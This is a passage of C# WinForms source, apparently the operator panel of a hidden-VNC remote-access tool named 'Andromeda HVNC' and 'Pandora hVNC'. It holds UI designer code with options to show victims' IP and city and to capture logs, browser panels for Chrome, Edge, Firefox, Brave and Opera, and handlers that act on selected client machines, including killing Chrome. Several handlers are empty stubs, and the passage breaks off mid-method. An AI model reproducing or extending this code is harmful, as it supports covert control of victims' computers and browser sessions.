            this.Guna2CheckBox10.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox10.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox10.Location = new System.Drawing.Point(29, 706);
            this.Guna2CheckBox10.Name = "Guna2CheckBox10";
            this.Guna2CheckBox10.Size = new System.Drawing.Size(105, 19);
            this.Guna2CheckBox10.TabIndex = 102;
            this.Guna2CheckBox10.Text = "Mostrar nome";
            this.Guna2CheckBox10.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox10.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox10.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox10.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox10.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox5
            // 
            this.Guna2CheckBox5.Animated = true;
            this.Guna2CheckBox5.AutoSize = true;
            this.Guna2CheckBox5.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox5.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox5.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox5.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox5.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox5.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox5.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox5.Location = new System.Drawing.Point(28, 654);
            this.Guna2CheckBox5.Name = "Guna2CheckBox5";
            this.Guna2CheckBox5.Size = new System.Drawing.Size(84, 19);
            this.Guna2CheckBox5.TabIndex = 97;
            this.Guna2CheckBox5.Text = "Mostrar IP";
            this.Guna2CheckBox5.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox5.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox5.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox5.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox5.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox9
            // 
            this.Guna2CheckBox9.Animated = true;
            this.Guna2CheckBox9.AutoSize = true;
            this.Guna2CheckBox9.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox9.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox9.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox9.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox9.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox9.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox9.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox9.Location = new System.Drawing.Point(28, 681);
            this.Guna2CheckBox9.Name = "Guna2CheckBox9";
            this.Guna2CheckBox9.Size = new System.Drawing.Size(86, 19);
            this.Guna2CheckBox9.TabIndex = 101;
            this.Guna2CheckBox9.Text = "Mostrar ID";
            this.Guna2CheckBox9.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox9.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox9.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox9.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox9.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox6
            // 
            this.Guna2CheckBox6.Animated = true;
            this.Guna2CheckBox6.AutoSize = true;
            this.Guna2CheckBox6.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox6.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox6.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox6.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox6.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox6.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox6.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox6.Location = new System.Drawing.Point(214, 624);
            this.Guna2CheckBox6.Name = "Guna2CheckBox6";
            this.Guna2CheckBox6.Size = new System.Drawing.Size(110, 19);
            this.Guna2CheckBox6.TabIndex = 98;
            this.Guna2CheckBox6.Text = "Mostrar Cidade";
            this.Guna2CheckBox6.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox6.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox6.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox6.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox6.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox8
            // 
            this.Guna2CheckBox8.Animated = true;
            this.Guna2CheckBox8.AutoSize = true;
            this.Guna2CheckBox8.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox8.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox8.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox8.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox8.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox8.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox8.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox8.Location = new System.Drawing.Point(214, 674);
            this.Guna2CheckBox8.Name = "Guna2CheckBox8";
            this.Guna2CheckBox8.Size = new System.Drawing.Size(118, 19);
            this.Guna2CheckBox8.TabIndex = 100;
            this.Guna2CheckBox8.Text = "Mostrar TLS/SSL";
            this.Guna2CheckBox8.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox8.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox8.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox8.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox8.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox7
            // 
            this.Guna2CheckBox7.Animated = true;
            this.Guna2CheckBox7.AutoSize = true;
            this.Guna2CheckBox7.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox7.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox7.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox7.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox7.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox7.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox7.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox7.Location = new System.Drawing.Point(214, 649);
            this.Guna2CheckBox7.Name = "Guna2CheckBox7";
            this.Guna2CheckBox7.Size = new System.Drawing.Size(102, 19);
            this.Guna2CheckBox7.TabIndex = 99;
            this.Guna2CheckBox7.Text = "Capturar Logs";
            this.Guna2CheckBox7.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox7.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox7.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox7.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox7.UseVisualStyleBackColor = false;
            // 
            // guna2Transition2
            // 
            this.guna2Transition2.AnimationType = Guna.UI2.AnimatorNS.AnimationType.HorizBlind;
            this.guna2Transition2.Cursor = null;
            animation14.AnimateOnlyDifferences = true;
            animation14.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation14.BlindCoeff")));
            animation14.LeafCoeff = 0F;
            animation14.MaxTime = 1F;
            animation14.MinTime = 0F;
            animation14.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation14.MosaicCoeff")));
            animation14.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation14.MosaicShift")));
            animation14.MosaicSize = 0;
            animation14.Padding = new System.Windows.Forms.Padding(0);
            animation14.RotateCoeff = 0F;
            animation14.RotateLimit = 0F;
            animation14.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation14.ScaleCoeff")));
            animation14.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation14.SlideCoeff")));
            animation14.TimeCoeff = 0F;
            animation14.TransparencyCoeff = 0F;
            this.guna2Transition2.DefaultAnimation = animation14;
            // 
            // Guna2Transition1
            // 
            this.Guna2Transition1.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Scale;
            this.Guna2Transition1.Cursor = null;
            animation13.AnimateOnlyDifferences = true;
            animation13.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation13.BlindCoeff")));
            animation13.LeafCoeff = 0F;
            animation13.MaxTime = 1F;
            animation13.MinTime = 0F;
            animation13.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation13.MosaicCoeff")));
            animation13.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation13.MosaicShift")));
            animation13.MosaicSize = 0;
            animation13.Padding = new System.Windows.Forms.Padding(0);
            animation13.RotateCoeff = 0F;
            animation13.RotateLimit = 0F;
            animation13.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation13.ScaleCoeff")));
            animation13.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation13.SlideCoeff")));
            animation13.TimeCoeff = 0F;
            animation13.TransparencyCoeff = 0F;
            this.Guna2Transition1.DefaultAnimation = animation13;
            this.Guna2Transition1.MaxAnimationTime = 1200;
            // 
            // FrmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.ClientSize = new System.Drawing.Size(1308, 811);
            this.Controls.Add(this.Painel_Home);
            this.Controls.Add(this.Painel_connection);
            this.Controls.Add(this.Painel_Ports);
            this.Controls.Add(this.Menu_Painel);
            this.Controls.Add(this.Painel_Menu);
            this.Controls.Add(this.panel2);
            this.Guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "FrmMain";
            this.Opacity = 0.97D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Andromeda HVNC";
            this.TransparencyKey = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(9)))), ((int)(((byte)(19)))));
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.FrmMain_FormClosed);
            this.Load += new System.EventHandler(this.FrmMain_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            this.Menu_Painel.ResumeLayout(false);
            this.Menu_Painel.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2CirclePictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2CirclePictureBox1)).EndInit();
            this.StatusPanel.ResumeLayout(false);
            this.StatusPanel.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ListenPort)).EndInit();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.Painel_Menu.ResumeLayout(false);
            this.Painel_Menu.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox27)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox21)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox1)).EndInit();
            this.Painel_connection.ResumeLayout(false);
            this.Painel_Home.ResumeLayout(false);
            this.Panel_ControlPage.ResumeLayout(false);
            this.Panel_ControlPage.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox31)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox30)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox26)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox25)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox24)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox23)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox22)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox19)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox20)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox17)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox16)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox15)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox14)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox80)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox18)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Chrome)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Edge)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Firefox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Brave)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna_Opera)).EndInit();
            this.Painel_Right.ResumeLayout(false);
            this.Painel_Right.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox40)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox70)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox29)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox8)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox10)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox11)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox12)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox13)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox35)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox41)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox36)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox42)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Moldura)).EndInit();
            this.Painel_Ports.ResumeLayout(false);
            this.Guna2GradientPanel12.ResumeLayout(false);
            this.Guna2GradientPanel12.PerformLayout();
            this.Guna2GradientPanel13.ResumeLayout(false);
            this.Guna2GradientPanel13.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox62)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox63)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox60)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox59)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox48)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox58)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox57)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox66)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox56)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox55)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox54)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox53)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox52)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox50)).EndInit();
            this.ResumeLayout(false);

		}

        private void Guna2CirclePictureBox1_Click(object sender, EventArgs e)
        {
			this.Close();
        }

        private void guna2PictureBox14_Click(object sender, EventArgs e)
        {

        }

        private void Guna2PictureBox80_Click(object sender, EventArgs e)
        {
            Guna2Transition1.HideSync(Guna_Edge);
            Guna2Transition1.HideSync(Guna_Firefox);
            Guna2Transition1.HideSync(Guna_Brave);
            Guna2Transition1.HideSync(Guna_Opera);
            Guna2Transition1.ShowSync(Guna_Chrome);
        }

        private void guna2PictureBox14_Click_1(object sender, EventArgs e)
        {
            Guna2Transition1.HideSync(Guna_Chrome);
            Guna2Transition1.HideSync(Guna_Firefox);
            Guna2Transition1.HideSync(Guna_Brave);
            Guna2Transition1.HideSync(Guna_Opera);
            Guna2Transition1.ShowSync(Guna_Edge);
        }

        private void guna2PictureBox15_Click(object sender, EventArgs e)
        {
            Guna2Transition1.HideSync(Guna_Chrome);
            Guna2Transition1.HideSync(Guna_Edge);
            Guna2Transition1.HideSync(Guna_Brave);
            Guna2Transition1.HideSync(Guna_Opera);
            Guna2Transition1.ShowSync(Guna_Firefox);
        }

        private void guna2PictureBox16_Click(object sender, EventArgs e)
        {
            Guna2Transition1.HideSync(Guna_Chrome);
            Guna2Transition1.HideSync(Guna_Edge);
            Guna2Transition1.HideSync(Guna_Firefox);
            Guna2Transition1.HideSync(Guna_Opera);
            Guna2Transition1.ShowSync(Guna_Brave);
        }

        private void guna2PictureBox17_Click(object sender, EventArgs e)
        {
            Guna2Transition1.HideSync(Guna_Chrome);
            Guna2Transition1.HideSync(Guna_Edge);
            Guna2Transition1.HideSync(Guna_Firefox);
            Guna2Transition1.HideSync(Guna_Brave);
            Guna2Transition1.ShowSync(Guna_Opera);
        }

        private void Guna2GradientButton7_Click(object sender, EventArgs e)
        {
            guna2Transition2.HideSync(Painel_Ports);
            guna2Transition2.HideSync(Painel_connection);
            guna2Transition2.ShowSync(Painel_Home);
        }

        private void Guna2GradientButton4_Click(object sender, EventArgs e)
        {
            guna2Transition2.HideSync(Painel_Ports);
            guna2Transition2.HideSync(Painel_Home);
            guna2Transition2.ShowSync(Painel_connection);
        }

        private void Guna2GradientButton5_Click(object sender, EventArgs e)
        {

        }

        private void Guna2GradientButton6_Click(object sender, EventArgs e)
        {
            guna2Transition2.HideSync(Painel_connection);
            guna2Transition2.HideSync(Painel_Home);
            guna2Transition2.ShowSync(Painel_Ports);
        }

       async private void Guna2Button4_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.KillChrome();
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (HVNCList.SelectedItems.Count == 0)
            {
                MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            if (HVNCList.SelectedItems.Count == 0)
            {
                MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (HVNCList.SelectedItems.Count == 0)
            {
                MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (HVNCList.SelectedItems.Count == 0)
            {
                MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            if (HVNCList.SelectedItems.Count == 0)
            {
                MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (HVNCList.SelectedItems.Count == 0)
            {
                MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void killBrowsersToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (HVNCList.SelectedItems.Count == 0)
            {
